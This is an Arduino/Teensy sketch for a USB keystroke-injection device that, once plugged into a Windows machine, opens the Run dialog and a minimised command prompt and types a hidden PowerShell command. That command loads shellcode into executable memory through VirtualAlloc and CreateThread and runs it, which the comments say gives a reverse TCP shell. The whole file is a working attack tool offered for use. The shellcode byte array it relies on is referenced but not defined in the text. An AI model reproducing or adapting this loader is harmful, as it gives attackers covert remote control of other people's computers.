
// Set built-in LED pin number.
int ledPin = 13;

void setup()
{
    pinMode(ledPin, OUTPUT);
    digitalWrite(ledPin, HIGH);
    delay(500);
    digitalWrite(ledPin, LOW);
    
    // Wait for drivers to install.
    hurryUp();

    // This gets our shell.
    spawnReverseTCP();
}

void loop()
{
}

// Wait for the driver to finish installing.
void hurryUp()
{
    // Check if Caps Lock is controllable yet.
    boolean areWeThereYet = capsCheck();

    // Spam the shit out of it if not.
    while (areWeThereYet == capsCheck())
    {
        returnCode(1, 500);
        hitCaps();
    }
    hitCaps();
}

// Check if Caps Lock is on.
boolean capsCheck()
{
    if ((activeLEDs() & 2) == 2)
    {
        return true;
    }
    else
    {
        return false;
    }
}

// Return keyboard LED status.
unsigned int activeLEDs()
{
    return int(keyboard_leds);
}

void returnCode(unsigned int numBlinks, unsigned int halfDelay)
{
    unsigned int count=0;
    for(count = 0; count != numBlinks; count++)
    {
        digitalWrite(ledPin, HIGH);
        delay(halfDelay);
        digitalWrite(ledPin, LOW);
        delay(halfDelay);
    }
}

// Press the Caps Lock button.
void hitCaps()
{
    Keyboard.set_key1(KEY_CAPS_LOCK);
    Keyboard.send_now();
    delay(100);
    clearKeys();
}

// Empty the keystroke buffer.
void clearKeys()
{
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

// Turn off Caps Lock.
void killCaps()
{
    if (capsCheck())
    {
        hitCaps();
    }
}

// Start the real magic.
void spawnReverseTCP()
{
    killCaps();
    
    // Keyboard is ready.
    returnCode(1, 100);                                            
    
    // Open the Run dialog.
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();
    clearKeys();
    
    delay(1000);
    
    // Run is ready.
    returnCode(1, 100);
    
    // Start a super small cmd.exe prompt.
    Keyboard.print("cmd.exe /T:01 /K MODE CON: COLS=17 LINES=1");
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    clearKeys();
    
    // Give CMD some time to appear.
    delay(3000);
    
    // CMD is ready.
    returnCode(1, 100);
    
    // Set the Powershell path based on architecture.
    Keyboard.println("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )");
    
    // All systems are go.
    returnCode(1, 100);
    

    /* * * * * * * * * * * *
     *                     *
     *  Take the red pill. *
     *                     *
     * * * * * * * * * * * */

    Keyboard.print("%PWRSHLXDD% -nop -w hidden -c \"$1 = '$c = ''");
    Keyboard.print("[DllImport(\\\"kernel32.dll\\\")]public static ext");
    Keyboard.print("ern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwS");
    Keyboard.print("ize, uint flAllocationType, uint flProtect);[DllIm");
    Keyboard.print("port(\\\"kernel32.dll\\\")]public static extern In");
    Keyboard.print("tPtr CreateThread(IntPtr lpThreadAttributes, uint ");
    Keyboard.print("dwStackSize, IntPtr lpStartAddress, IntPtr lpParam");
    Keyboard.print("eter, uint dwCreationFlags, IntPtr lpThreadId);[Dl");
    Keyboard.print("lImport(\\\"msvcrt.dll\\\")]public static extern I");
    Keyboard.print("ntPtr memset(IntPtr dest, uint src, uint count);''");
    Keyboard.print(";$w = Add-Type -memberDefinition $c -Name \\\"Win3");
    Keyboard.print("2\\\" -namespace Win32Functions -passthru;[Byte[]]");
    Keyboard.print(";[Byte[]]$sc = ");
    Keyboard.print(bytecode);
    Keyboard.print(";$size = 0x1000;if ($sc.Length -gt 0");
    Keyboard.print("x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0");
    Keyboard.print("x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);");
    Keyboard.print("$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$");
    Keyboard.print("i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){St");
    Keyboard.print("art-sleep 60};';$gq = [System.Convert]::ToBase64St");
    Keyboard.print("ring([System.Text.Encoding]::Unicode.GetBytes($1))");
    Keyboard.print(";if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot +");
    Keyboard.print(" \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\");
    Keyboard.print("powershell\\\";$cmd = \\\"-nop -noni -enc \\\";iex");
    Keyboard.print(" \\\" $x86 $cmd $gq\\\"}else{$cmd = \\\"-nop -noni");
    Keyboard.print(" -enc\\\";iex \\\" powershell $cmd $gq\\\";}\"");
    clearKeys();

    // Send the command.
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);
    clearKeys();
    
    // All done.
    returnCode(1, 1000);
}
